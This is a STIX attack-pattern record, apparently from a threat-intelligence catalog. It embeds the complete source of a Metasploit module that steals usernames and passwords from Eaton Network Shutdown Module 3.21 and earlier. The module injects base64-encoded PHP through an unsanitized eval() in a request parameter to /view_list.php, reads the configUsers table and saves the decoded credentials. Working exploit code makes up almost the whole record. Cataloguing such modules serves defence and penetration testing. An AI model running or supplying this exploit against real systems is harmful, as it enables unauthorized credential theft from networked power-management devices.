{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--82c81f2e-ee8c-4c3e-8a6f-931b56669278",
    "created": "2024-08-14T16:31:26.036786Z",
    "modified": "2024-08-14T16:31:26.036791Z",
    "name": "Network Shutdown Module sort_values Credential Dumper",
    "description": " This module will extract user credentials from Network Shutdown Module versions 3.21 and earlier by exploiting a vulnerability found in lib/dbtools.inc, which uses unsanitized user input inside a eval() call. Please note that in order to extract credentials, the vulnerable service must have at least one USV module (an entry in the \"nodes\" table in mgedb.db).  'References'     => [ ['OSVDB', '83199']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/eaton_nsm_creds.rb",
            "external_id": "eaton_nsm_creds.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Network Shutdown Module sort_values Credential Dumper',\n      'Description'    => %q{\n        This module will extract user credentials from Network Shutdown Module\n        versions 3.21 and earlier by exploiting a vulnerability found in\n        lib/dbtools.inc, which uses unsanitized user input inside a eval() call.\n        Please note that in order to extract credentials, the vulnerable service\n        must have at least one USV module (an entry in the \"nodes\" table in\n        mgedb.db).\n      },\n      'References'     =>\n        [\n          ['OSVDB', '83199'],\n          ['URL', 'https://web.archive.org/web/20121014000855/http://secunia.com/advisories/49103/']\n        ],\n      'Author'         =>\n        [\n          'h0ng10',\n          'sinn3r'\n        ],\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2012-06-26'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(4679)\n      ])\n  end\n\n  def execute_php_code(code, opts = {})\n    param_name = Rex::Text.rand_text_alpha(6)\n    padding    = Rex::Text.rand_text_alpha(6)\n    php_code   = Rex::Text.encode_base64(code)\n    url_param  = \"#{padding}%22%5d,%20eval(base64_decode(%24_POST%5b%27#{param_name}%27%5d))%29;%2f%2f\"\n\n    res = send_request_cgi(\n      {\n        'uri'   =>  '/view_list.php',\n        'method' => 'POST',\n        'vars_get' =>\n          {\n            'paneStatusListSortBy' => url_param,\n          },\n        'vars_post' =>\n          {\n            param_name => php_code,\n          },\n        'headers' =>\n          {\n            'Connection' => 'Close'\n          }\n        })\n    res\n  end\n\n  def read_credentials\n    pattern   = Rex::Text.rand_text_numeric(10)\n    users_var = Rex::Text.rand_text_alpha(10)\n    user_var  = Rex::Text.rand_text_alpha(10)\n    php = <<-EOT\n    $#{users_var} = &queryDB(\"SELECT * FROM configUsers;\");\n    foreach($#{users_var} as $#{user_var}) {\n    print \"#{pattern}\" .$#{user_var}[\"login\"].\"#{pattern}\".base64_decode($#{user_var}[\"pwd\"]).\"#{pattern}\";\n    } die();\n    EOT\n\n    print_status(\"Reading user credentials from the database\")\n    response = execute_php_code(php)\n\n    if not response or response.code != 200 then\n      print_error(\"Failed: Error requesting page\")\n      return\n    end\n\n    credentials = response.body.to_s.scan(/\\d{10}(.*)\\d{10}(.*)\\d{10}/)\n    return credentials\n  end\n\n  def run\n    credentials = read_credentials\n    if credentials.empty?\n      print_warning(\"No credentials collected.\")\n      print_warning(\"Sometimes this is because the server isn't in the vulnerable state.\")\n      return\n    end\n\n    cred_table = Rex::Text::Table.new(\n      'Header'  => 'Network Shutdown Module Credentials',\n      'Indent'  => 1,\n      'Columns' => ['Username', 'Password']\n    )\n\n    credentials.each do |record|\n      cred_table << [record[0], record[1]]\n    end\n\n    print_line\n    print_line(cred_table.to_s)\n\n    loot_name     = \"eaton.nsm.credentials\"\n    loot_type     = \"text/csv\"\n    loot_filename = \"eaton_nsm_creds.csv\"\n    loot_desc     = \"Eaton Network Shutdown Module Credentials\"\n    p = store_loot(loot_name, loot_type, datastore['RHOST'], cred_table.to_csv, loot_filename, loot_desc)\n    print_good(\"Credentials saved in: #{p.to_s}\")\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2012-06-26"
}